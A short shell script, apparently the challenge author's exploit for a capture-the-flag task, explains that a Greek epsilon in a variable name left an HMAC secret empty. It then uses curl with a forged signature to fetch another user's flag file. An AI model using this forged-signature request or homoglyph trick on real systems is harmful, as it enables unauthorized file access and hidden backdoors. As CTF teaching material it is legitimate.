#!/bin/sh

# exploit for "hidden in plain sight" by TheJH (challenge author)

PROTOCOL="https"

# This was really simple. In the following line in the code, the first
# "E" is actually not an "E" but a big epsilon, a greek letter that
# looks exactly the same.
# HMAC_SÎ•CRET = HMAC_SECRET + (Math.random()+'').substr(2)
# This means that the real HMAC secret was an empty string. :D

HMAC_SIG="4a332c7f27909f85a529393cea72301393f84cf5908aa2538137776f78624db4"
curl -s "$PROTOCOL://$1:$2/files/testuser/flag.txt/$HMAC_SIG" |
grep 'flag{.*}'
